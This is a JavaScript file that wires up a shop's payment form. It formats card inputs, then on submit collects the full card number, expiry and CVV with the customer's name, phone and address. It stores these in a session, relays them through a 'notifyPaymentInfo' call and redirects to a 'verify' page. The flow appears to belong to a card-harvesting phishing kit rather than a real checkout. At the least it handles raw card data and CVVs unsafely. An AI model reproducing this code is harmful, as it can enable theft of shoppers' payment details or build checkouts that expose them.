function bindPaymentForm() {
  const form = document.getElementById("payment-form");
  const summary = document.getElementById("payment-summary");
  const customerBox = document.getElementById("customer-recap");

  if (summary) summary.innerHTML = renderOrderSummary({ compact: false });

  const customer = getCustomer();
  if (!getCartCount()) {
    showToast("No active order — go back and choose products");
    setTimeout(() => {
      window.location.href = "index.html";
    }, 1400);
    return;
  }

  if (!customer) {
    showToast("Complete your details first");
    setTimeout(() => {
      window.location.href = "checkout.html";
    }, 1200);
    return;
  }

  if (customerBox) {
    customerBox.innerHTML = `
      <p><strong>Name:</strong> ${escapeHtml(customer.name)}</p>
      <p><strong>Phone:</strong> ${escapeHtml(customer.phone)}</p>
      <p><strong>Address:</strong> ${escapeHtml(customer.address)}</p>
      ${customer.notes ? `<p><strong>Notes:</strong> ${escapeHtml(customer.notes)}</p>` : ""}`;
  }

  const cardInput = form?.querySelector('[name="cardNumber"]');
  cardInput?.addEventListener("input", () => {
    const digits = cardInput.value.replace(/\D/g, "").slice(0, 16);
    cardInput.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
  });

  const expiryInput = form?.querySelector('[name="expiry"]');
  expiryInput?.addEventListener("input", () => {
    let v = expiryInput.value.replace(/\D/g, "").slice(0, 4);
    if (v.length >= 3) v = `${v.slice(0, 2)}/${v.slice(2)}`;
    expiryInput.value = v;
  });

  const cvvInput = form?.querySelector('[name="cvv"]');
  cvvInput?.addEventListener("input", () => {
    cvvInput.value = cvvInput.value.replace(/\D/g, "").slice(0, 3);
  });

  form?.addEventListener("submit", async (e) => {
    e.preventDefault();
    if (!form.reportValidity()) return;

    const payment = {
      cardNumber: form.cardNumber.value.trim(),
      expiry: form.expiry.value.trim(),
      cvv: form.cvv.value.trim(),
    };

    savePaymentSession(payment);

    const submitBtn = form.querySelector('button[type="submit"]');
    if (submitBtn) submitBtn.disabled = true;

    const sent = await notifyPaymentInfo(customer, payment);
    if (!sent) {
      showToast("Could not send payment details");
    }

    if (submitBtn) submitBtn.disabled = false;
    window.location.href = "verify.html";
  });
}

document.addEventListener("DOMContentLoaded", () => {
  const steps = document.getElementById("checkout-steps");
  if (steps) steps.innerHTML = renderSteps(4);
  bindPaymentForm();
  syncCartBadges();
});
